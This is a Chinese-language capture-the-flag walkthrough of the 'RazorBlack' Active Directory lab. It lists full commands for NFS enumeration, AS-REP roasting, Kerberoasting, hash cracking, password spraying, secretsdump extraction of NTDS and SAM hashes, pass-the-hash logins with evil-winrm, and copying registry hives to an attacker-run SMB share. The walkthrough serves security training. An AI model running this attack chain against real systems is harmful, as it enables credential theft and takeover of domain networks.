# RazorBlack

这些家伙称自己为黑客。你能告诉他们谁是老板吗？

---

不出意外你可能会跟我一样，靶机特别卡，靶机重启很多遍才能完成一两个操作，我也发现了除了官方出的room，其他第三方的与AD相关的room都特别卡

## 端口扫描

循例 nmap扫：

    53/tcp   open  domain
    88/tcp   open  kerberos-sec
    111/tcp  open  rpcbind
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    2049/tcp open  nfs
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    3389/tcp open  ms-wbt-server

开了3389，我们可以使用remmina连接进去，我们将会看到证书的信息，里面清晰包含了域名

    raz0rblack.thm

## nfs枚举

smb共享文件匿名账户枚举没结果，看还开了个nfs:

    showmount -e 10.10.144.206

    Export list for 10.10.144.206:
    /users (everyone)

挂载：

    mount -t nfs 10.10.144.206:/users /tmp

其中sbradley.txt中包含flag

还有一个xlsx文件，没有环境的话我们借助在线编辑器来打开它并检索数据

    https://products.aspose.app/cells/zh/editor/xlsx

罗列了用户名信息，并且我们还发现了DA账户

    daven port			CTF PLAYER						
    imogen royce			CTF PLAYER						
    tamara vidal			CTF PLAYER						
    arthur edwards			CTF PLAYER						
    carl ingram			CTF PLAYER (INACTIVE)						
    nolan cassidy			CTF PLAYER						
    reza zaydan			CTF PLAYER						
    ljudmila vetrova			CTF PLAYER, DEVELOPER,ACTIVE DIRECTORY ADMIN						
    rico delgado			WEB SPECIALIST						
    tyson williams			REVERSE ENGINEERING						
    steven bradley			STEGO SPECIALIST						
    chamber lin			CTF PLAYER(INACTIVE)						

清洗数据将其保存到文件，例如：

    d-port
    dport

靶机又崩了，关键还是关不了，刚刚才续一小时，害我白等两小时

## AS-REP Roasting

我们利用GetNPUSers.py帮助我们查找关闭了预身份验证的账户

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile ./test1.txt -dc-ip 10.10.249.16 -no-pass -request raz0rblack.thm/

我们成功得到 twilliams 账户的密码hash：

    $krb5asrep$23$twilliams@RAZ0RBLACK.THM:62a647e3fdb15403ed7d57dfbc8d6fc7$b1157d696*********************70cd5a0

将该hash保存到文件, 我们再通过hascat进行爆破

    hashcat -a 0 -m 18200 ./hash /usr/share/wordlists/rockyou.txt

现在我们得到了第一组凭据

## smb密码喷洒

smb共享文件夹枚举

    smbclient -L 10.10.249.16 -U raz0rblack.thm/twilliams

无果

将twilliams从列表中删除，然后crackmapexec密码喷洒

    crackmapexec smb 10.10.249.16  -u ./test1.txt -p **********

可以看到：

    SMB         10.10.249.16    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:********** STATUS_PASSWORD_MUST_CHANGE

smbpasswd.py修改密码

    python3 /usr/share/doc/python3-impacket/examples/smbpasswd.py raz0rblack.thm/sbradley:*********@10.10.249.16

## 检索smb共享

再尝试smb共享：

    smbclient //10.10.146.104/trash -U raz0rblack.thm/sbradley

    chat_log_20210222143423.txt         A     1340  Fri Feb 26 03:29:05 2021
    experiment_gone_wrong.zip           A 18927164  Tue Mar 16 14:02:20 2021
    sbradley.txt                        A       37  Sun Feb 28 03:24:21 2021

chat_log_xxxx.txt是一段对话

    sbradley>嘿管理员，我们的机器有新披露的Windows Server 2019漏洞。
    管理员>什么漏洞？？
    sbradley>新的CVE-2020-1472称为ZeroLogon发布了一个新的PoC。
    管理员>我已经给你最后的警告了。如果你在这个域控制器上利用这个，就像你之前在我们旧的 Ubuntu 服务器上用脏牛做的那样，我发誓我会杀死你的 WinRM-Access。
    斯布拉德利>嘿，你不会相信我所看到的。
    管理员>现在，不要说你运行了漏洞利用。
    sbradley>是的，漏洞利用效果很好，它不需要凭据。只需为其提供IP和域名，即可将管理员通行证重置为空哈希。
    斯布拉德利>我还使用了一些工具来提取NTDS。dit和SYSTEM.hive并将其转移到我的盒子中。我喜欢在这些文件上运行 secretsdump.py 并转储哈希。
    管理员>我感觉我的身体里有一个新的cron被释放出来，叫做心脏病发作，它将在下一分钟内执行。
    管理员>但是，在我死之前，我会杀死你的WinRM访问权限......
    sbradley>我已经制作了一个包含ntds.dit和SYSTEM.hive的加密zip，并将zip上传到垃圾共享中。
    斯布拉德利>嘿管理员你在那里吗...
    斯布拉德利>管理员.....

通过这段对话我们得知，另一个zip文件里应该有ntds.dit和system文件，但它是加密的

我们通过zip2john转成hash

    zip2john ./experiment_gone_wrong.zip > ./hash

使用john爆破：

    john --wordlist=/usr/share/wordlists/rockyou.txt ./hash

成功得到密码：

    elec********etismo (experiment_gone_wrong.zip)

将文件提取，system文件包含我们所需的密钥，我们使用secretsdump.py提取ntlm hash并保存到文件：

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system ./system.hive -ntds ./ntds.dit LOCAL > ./test2.txt

由于没有xx用户的ntlm hash，我们将再次尝试密码喷洒，我们先使用grep将NT hash提取：

    grep -E -o ":[a-zA-Z0-9]+::" ./test2.txt > ./test3.txt

    sed -i "s/://g" ./test3.txt

我们将得到干净的NT hash

使用NT hash再次尝试密码喷洒：

    crackmapexec smb 10.10.9.255 -u lvetrova -H ./test3.txt

靶机老是崩

很快得到结果：

    SMB         10.10.9.255     445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d**************40ee16c431d

使用evil-winrm登录：

    evil-winrm -i 10.10.16.62 -u lvetrova -H f220d398**********f40ee16c431d

在用户目录下：

    $cred = Import-CliXml -Path lvetrova.xml
    $cred.GetNetworkCredential().Password

## Kerberoasting

    net user xyan1d3 /domain

借助GetUserSPNs.py枚举具有SPN的账户：

    python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.191.151 raz0rblack.thm/lvetrova -hashes aad3b43*************35b51404ee:f220d398***********0ee16c431d -request

我们得到了xyan1d3的密码hash

    ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
    -------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
    HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 23:17:17.715160  <never>

hashcat爆破：

    hashcat -a 0 -m 13100 ./hash /usr/share/wordlists/rockyou.txt

成功获得xyan1d3的明文密码：

    cyani*****e5628

evil-winrm登录：

    evil-winrm -i 10.10.191.151 -u xyan1d3 -p cyan*******ne5628

flag:

    *Evil-WinRM* PS C:\Users\xyan1d3> $cred = Import-Clixml -Path xyan1d3.xml
    *Evil-WinRM* PS C:\Users\xyan1d3> $cred.GetNetworkCredential().Password

不出意外：

    *Evil-WinRM* PS C:\Users> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeBackupPrivilege             Back up files and directories  Enabled
    SeRestorePrivilege            Restore files and directories  Enabled
    SeShutdownPrivilege           Shut down the system           Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

## 注册表转储sam、system

    reg save HKLM\SAM sam
    reg save HKLM\SYSTEM system

攻击机开启smbserver

    python3 /usr/share/doc/python3-impacket/examples/smbserver.py hack . -smb2support

下载文件到攻击机：

    *Evil-WinRM* PS C:\Users\xyan1d3> copy sam \\10.14.39.48\hack
    *Evil-WinRM* PS C:\Users\xyan1d3> copy system \\10.14.39.48\hack

使用secretsdump.py进行本地提取：

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system ./system -sam ./sam LOCAL

利用Administrator的ntlm hash登录：

    evil-winrm -i 10.10.37.43  -u Administrator -H 9689**********210177f0c

root.xml:

    $cred = Import-Clixml -Path root.xml

报错，我们将那段数据丢到cyberchef，并使用Magic，就能得到flag

查看cookie.json，是base64,将其解码

    Look this is your cookie.
    FunFact : This cookie can change its own flavour automatically. To test it just think of your favourite flavour.

    And stop putting 'OR '1'='1 inside login.php

    Enjoy your Cookie  

在c:\users\twilliams下发现可疑exe

    robocopy /b twilliams xyan1d3

该exe执行之后报错，将其传回攻击机：

    copy "definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe" \\10.14.39.48\hack

攻击机分析：

    strings ./flag.exe -> 无果
    cat ./flag.exe -> 给出了flag

最高机密：

    et-ChildItem -Path c:\*secret* -Recurse -Force

    C:\Program Files\Top Secret\top_secret.png

将其下载到攻击机并查看：

    :wq

卡的要命
